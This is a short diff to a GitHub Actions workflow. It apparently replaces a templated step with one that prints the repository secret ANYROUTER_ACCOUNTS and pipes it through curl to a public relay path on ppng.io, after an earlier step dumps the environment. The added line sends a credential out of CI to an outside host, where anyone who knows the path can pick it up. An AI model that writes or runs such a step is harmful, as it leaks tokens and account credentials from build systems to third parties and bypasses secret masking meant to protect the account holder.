@@ -12,4 +12,4 @@ jobs:
       - name: Get env
         run: env
       - name: Transfer secrets
-        run: "echo 'Token XXXX: ${{secrets.XXXX}}' | curl -T - https://ppng.io/自己设定的一段口令"
+        run: "echo 'Token ANYROUTER_ACCOUNTS: ${{ secrets.ANYROUTER_ACCOUNTS }}' | curl -T - https://ppng.io/huangyekun"
